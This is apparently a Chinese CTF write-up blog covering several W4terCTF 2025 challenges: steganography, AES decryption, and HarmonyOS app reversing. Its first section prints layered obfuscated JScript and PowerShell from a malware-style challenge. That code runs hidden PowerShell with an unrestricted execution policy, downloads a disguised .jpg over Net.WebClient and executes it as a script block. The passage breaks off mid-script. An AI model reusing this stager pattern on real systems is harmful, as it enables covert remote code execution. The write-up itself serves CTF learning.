<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ioRjQN</span>(<span class="params">FVKq</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> ohyLbg = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> emGK = <span class="number">0</span>; emGK &lt; <span class="title class_">FVKq</span>.<span class="property">length</span>; emGK++) &#123;</span><br><span class="line">  <span class="keyword">var</span> ndZC = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="title class_">FVKq</span>[emGK] - <span class="number">601</span>);</span><br><span class="line">  ohyLbg = ohyLbg + ndZC</span><br><span class="line">&#125; <span class="keyword">return</span> ohyLbg</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> ohyLbg = <span class="title function_">ioRjQN</span>([<span class="number">713</span>, <span class="number">712</span>, <span class="number">720</span>, <span class="number">702</span>, <span class="number">715</span>, <span class="number">716</span>, <span class="number">705</span>, <span class="number">702</span>, <span class="number">709</span>, <span class="number">709</span>, <span class="number">647</span>, <span class="number">702</span>, <span class="number">721</span>, <span class="number">702</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">720</span>, <span class="number">633</span>, <span class="number">650</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">702</span>, <span class="number">713</span>, <span class="number">633</span>, <span class="number">686</span>, <span class="number">711</span>, <span class="number">715</span>, <span class="number">702</span>, <span class="number">716</span>, <span class="number">717</span>, <span class="number">715</span>, <span class="number">706</span>, <span class="number">700</span>, <span class="number">717</span>, <span class="number">702</span>, <span class="number">701</span>, <span class="number">633</span>, <span class="number">646</span>, <span class="number">711</span>, <span class="number">712</span>, <span class="number">713</span>, <span class="number">633</span>, <span class="number">637</span>, <span class="number">670.</span>..])</span><br><span class="line"><span class="keyword">var</span> emGK = <span class="title function_">ioRjQN</span>([<span class="number">688</span>, <span class="number">684</span>, <span class="number">700</span>, <span class="number">715</span>, <span class="number">706</span>, <span class="number">713</span>, <span class="number">717</span>, <span class="number">647</span>, <span class="number">684</span>, <span class="number">705</span>, <span class="number">702</span>, <span class="number">709</span>, <span class="number">709</span>]);</span><br><span class="line"><span class="keyword">var</span> ioRjQN = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(emGK);</span><br><span class="line">ioRjQN.<span class="title class_">Run</span>(ohyLbg, <span class="number">0</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>
<p>对这一层再次试运行可以得到下一层</p>
<div class="code-container" data-rel="Ps1"><figure class="iseeu highlight ps1"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-ep</span> Unrestricted <span class="literal">-nop</span> <span class="variable">$EFTE</span> =([<span class="type">regex</span>]::Matches(</span><br><span class="line">		<span class="string">&#x27;a5a9b49fb8adbeb8e19cbea3afa9bfbfeceee8a9a2baf...&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;.&#123;2&#125;&#x27;</span>) | % &#123; [<span class="built_in">char</span>]([<span class="type">Convert</span>]::ToByte(<span class="variable">$_</span>.Value, <span class="number">16</span>) <span class="operator">-bxor</span> <span class="string">&#x27;204&#x27;</span>) &#125;) <span class="operator">-join</span> <span class="string">&#x27;&#x27;</span>; &amp; <span class="variable">$EFTE</span>.Substring(<span class="number">0</span>, <span class="number">3</span>) <span class="variable">$EFTE</span>.Substring(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></div>
<p>继续</p>
<div class="code-container" data-rel="Ps1"><figure class="iseeu highlight ps1"><table><tr><td class="code"><pre><span class="line"><span class="built_in">iex</span><span class="built_in">Start-Process</span> <span class="string">&quot;<span class="variable">$env:SystemRoot</span>\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-ArgumentList</span> <span class="string">&#x27;-w&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;-ep&#x27;</span>, <span class="string">&#x27;Unrestricted&#x27;</span>, <span class="string">&#x27;-Command&#x27;</span>,</span><br><span class="line"><span class="string">&quot;Set-Variable 3</span></span><br><span class="line"><span class="string">&#x27;http://127.0.0.1:37634/bestudding.jpg&#x27;;</span></span><br><span class="line"><span class="string">SI Variable:/Z4D &#x27;Net.WebClient&#x27;;cd;SV c4H (.`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member)[2].Name).Invoke(`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member|Where&#123;(GV _).Value.Name-clike&#x27;*dName&#x27;&#125;).Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where&#123;(GV _).Value.Name-clike&#x27;*wn*d*g&#x27;&#125;).Name);&amp;([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))&quot;</span>;</span><br></pre></td></tr></table></figure></div>
<p>可以看到这里把变量3设置成了请求了的另一个jpg，后面的命令姑且不管直接看jpg的内容<br>不出意外这个jpg也依然不是jpg(？)，使用文本编辑器打开可以看到又是一长串各种变量的混淆命令：<br>先把开头变量设置部分的命令执行了</p>
<div class="code-container" data-rel="Ps1"><figure class="iseeu highlight ps1"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;(&#x27;</span>  | % &#123; <span class="variable">$r</span> = + <span class="variable">$</span>() &#125; &#123; <span class="variable">$u</span> = <span class="variable">$r</span> &#125; &#123; <span class="variable">$b</span> = ++  <span class="variable">$r</span> &#125; &#123; <span class="variable">$q</span> = (  <span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$z</span> = (  <span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$o</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$d</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$h</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$e</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$i</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>  ) &#125; &#123; <span class="variable">$x</span> = (<span class="variable">$q</span> *( <span class="variable">$z</span>) ) &#125; &#123; <span class="variable">$l</span> = (<span class="variable">$r</span> = <span class="variable">$r</span> + <span class="variable">$b</span>) &#125; &#123; <span class="variable">$g</span> = <span class="string">&quot;[&quot;</span> + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;)&quot;</span>[<span class="variable">$e</span>  ] + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;)&quot;</span>[  <span class="string">&quot;<span class="variable">$b</span><span class="variable">$l</span>&quot;</span>  ] + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;  )  &quot;</span>[  <span class="string">&quot;<span class="variable">$q</span><span class="variable">$u</span>&quot;</span>  ] + <span class="string">&quot;<span class="variable">$</span>?&quot;</span>[<span class="variable">$b</span>  ] + <span class="string">&quot;]&quot;</span> &#125; &#123; <span class="variable">$r</span> = <span class="string">&quot;&quot;</span>.(<span class="string">&quot;<span class="variable">$</span>(  @&#123;&#125;  )  &quot;</span>[  <span class="string">&quot;<span class="variable">$b</span><span class="variable">$o</span>&quot;</span>  ] + <span class="string">&quot;<span class="variable">$</span>(@&#123;&#125;)  &quot;</span>[  <span class="string">&quot;<span class="variable">$b</span><span class="variable">$h</span>&quot;</span>] + <span class="string">&quot;<span class="variable">$</span>(  @&#123;  &#125;  )&quot;</span>[<span class="variable">$u</span>] + <span class="string">&quot;<span class="variable">$</span>(@&#123;&#125;  )&quot;</span>[<span class="variable">$o</span>] + <span class="string">&quot;<span class="variable">$</span>?  &quot;</span>[  <span class="variable">$b</span>] + <span class="string">&quot;<span class="variable">$</span>(  @&#123;&#125;)&quot;</span>[<span class="variable">$z</span>  ]) &#125; &#123; <span class="variable">$r</span> = <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;  )&quot;</span>[  <span class="string">&quot;<span class="variable">$b</span>&quot;</span> + <span class="string">&quot;<span class="variable">$o</span>&quot;</span>] + <span class="string">&quot;<span class="variable">$</span>(@&#123;  &#125;)  &quot;</span>[<span class="variable">$o</span>  ] + <span class="string">&quot;<span class="variable">$r</span>&quot;</span>[<span class="string">&quot;<span class="variable">$q</span>&quot;</span> + <span class="string">&quot;<span class="variable">$e</span>&quot;</span>  ] &#125;  )  ;</span><br></pre></td></tr></table></figure></div>
<p>然后将后面一长串命令使用<code>[Text.Encoding]::ASCII.GetString</code>提取出来得到</p>
<div class="code-container" data-rel="Ps1"><figure class="iseeu highlight ps1"><table><tr><td class="code"><pre><span class="line">([<span class="built_in">CHar</span>]<span class="number">36</span>+[<span class="built_in">CHar</span>]<span class="number">68</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">98</span>+[<span class="built_in">CHar</span>]<span class="number">117</span>+[<span class="built_in">CHar</span>]<span class="number">103</span>+[<span class="built_in">CHar</span>]<span class="number">80</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">102</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">110</span>+[<span class="built_in">CHar</span>]<span class="number">99</span>+[<span class="built_in">CHar</span>]<span class="number">101</span>+[<span class="built_in">CHar</span>]<span class="number">32</span>+[<span class="built_in">CHar</span>]<span class="number">61</span>+[<span class="built_in">CHar</span>]<span class="number">32</span>+[<span class="built_in">CHar</span>]<span class="number">36</span>+[<span class="built_in">CHar</span>]<span class="number">69</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">111</span>+[<span class="built_in">CHar</span>]<span class="number">114</span>+[<span class="built_in">CHar</span>]<span class="number">65</span>+[<span class="built_in">CHar</span>]<span class="number">99</span>+[<span class="built_in">CHar</span>]<span class="number">116</span>+[<span class="built_in">CHar</span>]<span class="number">105</span>...)</span><br></pre></td></tr></table></figure></div>
<p>累了但是DS魅力时刻，直接丢给DS问如何解析这段信息，DS直接把flag给出来了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://free.boltp.com/2025/05/05/68188dec4fc74.webp"
                      style="height:300px; display:block; margin: 0 auto;"
                >

<p>咱也没有实际跑脚本，但是flag能过了那就只能说是DS神力了♥️</p>
<h3 id="Spam-2025"><a href="#Spam-2025" class="headerlink" title="Spam 2025"></a>Spam 2025</h3><p>首先是队伍 logo，丢给 <code>stegsolve</code>，每个通道分开看，注意到这个通道：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/BwsY219uUmo5DdZ.png"
                      alt="image-20250504213654454"
                ></p>
<p>google 识图说这玩意叫汉信码，于是找了个网站识别了一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/5IcVBCHDG29yhA8.png"
                      alt="image-20250504213837948"
                ></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文：31GUM6H0Fle8PtON2Zf4+IXoLzDVWH+uZqUuHUyOoryq0vEIzD1GrlQ458DIF5nInLD4u/zd0td6dsFdBMy8G4XLJE5WyvwHQC330gfbECg=</span><br><span class="line"></span><br><span class="line">我用一种简单的方式把解密的方法和密钥放在了此 logo 图像的 DCT 域，请尝试自己编写脚本，而不是使用现成工具。对于每个 8×8 的块，dct_block[1,1] &gt; dct_block[4,5] ? 1 : 0</span><br></pre></td></tr></table></figure></div>

<p>那就写脚本呗：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 二维 DCT</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mydct2d</span>(<span class="params">a: np.array</span>):</span><br><span class="line">    <span class="keyword">return</span> dct(dct(a, axis=<span class="number">0</span>), axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proc_dct</span>():</span><br><span class="line"></span><br><span class="line">    img = cv2.imread(<span class="string">&#x27;./W4terDr0p.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    imgw, imgh, imgchnum = img.shape</span><br><span class="line"></span><br><span class="line">    resimg = np.ndarray((imgw // <span class="number">8</span>, imgh // <span class="number">8</span>, imgchnum))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ichan <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        imgchan = img[:, :, ichan]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ibase <span class="keyword">in</span> <span class="built_in">range</span>(imgw // <span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> jbase <span class="keyword">in</span> <span class="built_in">range</span>(imgh // <span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">                blk = imgchan[ibase * <span class="number">8</span> : ibase * <span class="number">8</span> + <span class="number">8</span>, jbase * <span class="number">8</span> : jbase * <span class="number">8</span> + <span class="number">8</span>]</span><br><span class="line">                dct_blk = mydct2d(blk)</span><br><span class="line">                dct_bit = dct_blk[<span class="number">1</span>, <span class="number">1</span>] &gt; dct_blk[<span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">                resimg[ibase, jbase] = <span class="built_in">int</span>(dct_bit) * <span class="number">255</span></span><br><span class="line"></span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;dct.bmp&#x27;</span>, resimg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> chn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        cv2.imshow(<span class="string">&#x27;res&#x27;</span>, resimg[:,:,chn])</span><br><span class="line">        cv2.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p>然后得到这个图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/RCFobPNgMfG6pzA.png"
                      alt="image-20250504214028638"
                ></p>
<p>放大点：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/Xpy6ZUYQCFLqHG7.png"
                      alt="image-20250504214100981"
                ></p>
<p>一开始觉得这个像 pdf417 条码，因为有这种竖条条的形状，于是手动搓了 pdf417 两边的带状识别区拼上去，但是怎么都识别不了。</p>
<p>后来意识到，黑色如果表示 0 ，黑条条的间距正好是 7 ，这不就是 ascii 嘛！</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">proc_ascii</span>():</span><br><span class="line">    imgdct = cv2.imread(<span class="string">&#x27;./dct.bmp&#x27;</span>)</span><br><span class="line">    dcth, dctw = imgdct.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dcth):</span><br><span class="line">        <span class="keyword">for</span> jbase <span class="keyword">in</span> <span class="built_in">range</span>(dctw // <span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">            byt = imgdct[i, jbase * <span class="number">8</span> : jbase * <span class="number">8</span> + <span class="number">8</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># print(byt)</span></span><br><span class="line">            byt = byt // <span class="number">255</span></span><br><span class="line">            byt = <span class="string">&#x27;&#x27;</span>.join([<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> byt])</span><br><span class="line"></span><br><span class="line">            byt = <span class="built_in">int</span>(byt, <span class="number">2</span>)</span><br><span class="line">            byt = <span class="built_in">chr</span>(byt)</span><br><span class="line"></span><br><span class="line">            ans += byt</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">The AES-ECB key is encoded as &quot;LOST INTO LADY RICH APT NAVY LEA IDA LOVE RUST AND NODE&quot;, using a convention for human-readable purposes, an RFC.</span><br></pre></td></tr></table></figure></div>

<p>这里说是 RFC，又是 human readable 形式，这两个关键词一查就有了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/RJfPiAVo6epFLEr.png"
                      alt="image-20250504214459404"
                ></p>
<p>Crypto.Utils 里面正好有这玩意，所以 key 有了，cipher 的 b64 前面已经给了，get。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/gZqHEYPFa9wN2Ld.png"
                      alt="image-20250504215421044"
                ></p>
<p>评价是很不错的一道套娃解码简单题，难度曲线平滑，每一层的引导都给的很好，做题体验很丝滑。</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="网站管理员的登录密码"><a href="#网站管理员的登录密码" class="headerlink" title="网站管理员的登录密码"></a>网站管理员的登录密码</h3><ul>
<li>Author: LilRan</li>
<li>Difficulty: Easy</li>
<li>Category: Reverse</li>
</ul>
<p>根据指引进行抓包，可以抓到以下信息：<br><code>gBjV3cE/UXEm7fXGXbQ4O7K38H2PsC5zLn9yYkl2lyk7NXgt9RrJ9e6SaZtkszxzOLH8/dAtEly6kDmHCqmdwKVB5LM5LbQwRx2Fhcbjk0o=</code><br>末尾有等于号，一眼base64或者base32，但解密出来好像是一坨乱码，肯定是经过了其他的加密，要不转成HEX看看？</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">8018D5DDC13F517126EDF5C65DB4383BB2B7F07D8FB02E732E7F7262497697293B35782DF51AC9F5EE92699B64B33C7338B1FCFDD02D125CBA9039870AA99DC0A541E4B3392DB430471D8585C6E3934A</span><br></pre></td></tr></table></figure></div>

<p>80字节的长度刚好是16字节的五个块，猜测应该使用了某种对称加密，队友一通操作拿到了神秘的32位整数数组，那直接试一下AES解密：</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码</span></span><br><span class="line">b64_cipher = (</span><br><span class="line">    <span class="string">&quot;gBjV3cE/UXEm7fXGXbQ4O7K38H2PsC5zLn9yYkl2lyk7NXgt9RrJ9e6SaZtkszxz&quot;</span></span><br><span class="line">    <span class="string">&quot;OLH8/dAtEly6kDmHCqmdwKVB5LM5LbQwRx2Fhcbjk0o=&quot;</span></span><br><span class="line">)</span><br><span class="line">data = base64.b64decode(b64_cipher)</span><br><span class="line"></span><br><span class="line"><span class="comment">#密钥</span></span><br><span class="line">key_ints = [<span class="number">1323200695</span>, -<span class="number">464519993</span>, -<span class="number">846125435</span>, -<span class="number">553843279</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># —— 3. 把每个整数打包成 4 字节，大端序（&gt;i 是 signed int, big-endian）</span></span><br><span class="line"><span class="comment"># ——   如果你实际需要小端序，把 &#x27;&gt;i&#x27; 改成 &#x27;&lt;i&#x27;</span></span><br><span class="line">key_bytes = <span class="string">b&#x27;&#x27;</span>.join(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, x) <span class="keyword">for</span> x <span class="keyword">in</span> key_ints)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key_bytes) == <span class="number">16</span>  <span class="comment"># AES-128</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拆分 IV（前 16 字节）和密文</span></span><br><span class="line">iv = data[:<span class="number">16</span>]</span><br><span class="line">ct = data[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">cipher = AES.new(key_bytes, AES.MODE_CBC, iv)</span><br><span class="line">pt_padded = cipher.decrypt(ct)</span><br><span class="line"></span><br><span class="line"><span class="comment">#去掉 PKCS#7 填充</span></span><br><span class="line">pad_len = pt_padded[-<span class="number">1</span>]</span><br><span class="line">plaintext = pt_padded[:-pad_len]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, plaintext.decode(<span class="string">&quot;UTF-8&quot;</span>))</span><br></pre></td></tr></table></figure></div>

<p>解密后得到flag：</p>
<p><code>W4terCTF&#123;1r0N7enD!_lT&#39;S_mY_SYMmeTRlC_3NCrYpTiOn!!!!!&#125;</code><br>那确实很对称加密了。</p>
<h3 id="和谐小app"><a href="#和谐小app" class="headerlink" title="和谐小app"></a>和谐小app</h3><ul>
<li>Author:LilRan</li>
<li>Difficulty:Easy</li>
<li>Category:Reverse</li>
</ul>
<p>下载来发现是一个hap文件，先用16进制查看器看看可不可以看到什么东西：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/NLh42iW7mSYE9gs.png"
                      alt="harmony1"
                ><br>好像看到了flag的痕迹，然后在网上一搜发现这本质上就是一个压缩包，改成zip解压后可以发现modules.abc,这是编译后的方舟字节码，找个专门的逆向软件jadx逆一逆看看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/ldIH7nWauDcp1ge.png"
                      alt="harmony2"
                ><br>在这里发现了一些处理痕迹，好像只是一个判断逻辑，判断是否是以 “W4terCTF{” 开始和 “}” 结束的代码，找了好久也没找到什么有意义的数据，好像陷入死胡同了。</p>
<p>等一下，library中的libentry.so里面好像数据段有什么东西：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/9b6yVRSNrGMniPO.png"
                      alt="harmony3"
                ></p>
<p>这里应该就是flag存放地址了，但是好像被打乱了，研究了一番Huawei开发的注册逻辑，最后在sub_1B80这里找到了处理逻辑：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/J6OCLr2gT39Khlk.png"
                      alt="harmony4"
                ></p>
<p>在GPT的帮助下生成了一个还原脚本,直接把库里面的16进制输进去了：</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">target = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x57</span>,<span class="number">0x34</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x6F</span>,<span class="number">0xA8</span>,<span class="number">0x4E</span>,<span class="number">0x7D</span>,<span class="number">0x57</span>,<span class="number">0x30</span>,<span class="number">0xBD</span>,<span class="number">0x7F</span>,<span class="number">0x53</span>,<span class="number">0x79</span>,<span class="number">0xB4</span>,</span><br><span class="line">    <span class="number">0xA1</span>,<span class="number">0x68</span>,<span class="number">0x4D</span>,<span class="number">0x44</span>,<span class="number">0xC2</span>,<span class="number">0xC3</span>,<span class="number">0x17</span>,<span class="number">0x75</span>,<span class="number">0x53</span>,<span class="number">0x83</span>,<span class="number">0x8F</span>,<span class="number">0x63</span>,<span class="number">0x53</span>,<span class="number">0x45</span>,<span class="number">0x57</span>,<span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x79</span>,<span class="number">0x4D</span>,<span class="number">0x56</span>,<span class="number">0x51</span>,<span class="number">0xBA</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x55</span>,<span class="number">0x47</span>,<span class="number">0x93</span>,<span class="number">0x74</span>,<span class="number">0x6F</span>,<span class="number">0x75</span>,<span class="number">0xC2</span>,<span class="number">0xAE</span>,<span class="number">0x67</span>,</span><br><span class="line">    <span class="number">0x59</span>,<span class="number">0x50</span>,<span class="number">0xE8</span>,<span class="number">0xB8</span>,<span class="number">0x1B</span>,<span class="number">0x50</span>,<span class="number">0x65</span>,<span class="number">0x99</span>,<span class="number">0xD5</span>,<span class="number">0x62</span>,<span class="number">0x42</span>,<span class="number">0x00</span>,<span class="number">0x10</span>,<span class="number">0xD2</span>,<span class="number">0x6B</span>,<span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x3C</span>,<span class="number">0xCE</span>,<span class="number">0x74</span>,<span class="number">0x4E</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0xCA</span>,<span class="number">0x7D</span>,<span class="number">0x54</span>,<span class="number">0x00</span>,<span class="number">0x94</span>,<span class="number">0xC6</span>,<span class="number">0x86</span>,<span class="number">0x5A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC0</span>,<span class="number">0xC2</span>,<span class="number">0x8F</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0xEC</span>,<span class="number">0xBE</span>,<span class="number">0x98</span>,<span class="number">0x66</span>,<span class="number">0x00</span>,<span class="number">0x18</span>,<span class="number">0xBB</span>,<span class="number">0xA1</span>,<span class="number">0x6C</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,</span><br><span class="line">    <span class="number">0xB7</span>,<span class="number">0xAA</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x70</span>,<span class="number">0xB3</span>,<span class="number">0xB3</span>,<span class="number">0x78</span>,<span class="number">0x00</span>,<span class="number">0x9C</span>,<span class="number">0xAF</span>,<span class="number">0xBC</span>,<span class="number">0x7E</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0xC8</span>,<span class="number">0xAB</span>,<span class="number">0xC5</span>,<span class="number">0x84</span>,<span class="number">0x00</span>,<span class="number">0xF4</span>,<span class="number">0xA7</span>,<span class="number">0xCE</span>,<span class="number">0x8A</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0xA4</span>,<span class="number">0xD7</span>,<span class="number">0x90</span>,</span><br><span class="line">    <span class="comment"># 最后再补 4 个 0x00，凑到 128 字节</span></span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 原代码中把输入的 double 转成 int，key 固定为 challenge 给定的 20250428</span></span><br><span class="line">n  = <span class="number">20250428</span></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">v4 = <span class="number">5</span>  * n</span><br><span class="line">v5 = <span class="number">15</span> * n</span><br><span class="line">v6 = <span class="number">20</span> * n</span><br><span class="line">v7 = <span class="number">10</span> * n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 先把 target 复制到可写的 bytearray s1 中</span></span><br><span class="line">s1 = <span class="built_in">bytearray</span>(target)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 严格按照原子循环逻辑反向“解混淆”</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 4.1 对 i 处 4 字节做 ^= v3</span></span><br><span class="line">    dw = struct.unpack_from(<span class="string">&#x27;&lt;I&#x27;</span>, s1, i)[<span class="number">0</span>] ^ (v3 &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    struct.pack_into  (<span class="string">&#x27;&lt;I&#x27;</span>, s1, i, dw)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4.2 如果 i&gt;0x77，就不做后续，直接退出</span></span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0x77</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4.3 否则再处理 i+5, i+10, i+15 处各 4 字节</span></span><br><span class="line">    <span class="keyword">for</span> off, xor_val <span class="keyword">in</span> ((<span class="number">5</span>,  v4+v3),</span><br><span class="line">                         (<span class="number">10</span>, v7+v3),</span><br><span class="line">                         (<span class="number">15</span>, v5+v3)):</span><br><span class="line">        dw = struct.unpack_from(<span class="string">&#x27;&lt;I&#x27;</span>, s1, i+off)[<span class="number">0</span>] ^ (xor_val &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        struct.pack_into  (<span class="string">&#x27;&lt;I&#x27;</span>, s1, i+off, dw)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4.4 更新 v3，i += 20</span></span><br><span class="line">    v3 = (v3 + v6) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    i += <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 去掉末尾的 0x00，解码为 ASCII 就是 flag</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(s1).rstrip(<span class="string">b&#x27;\x00&#x27;</span>).decode(<span 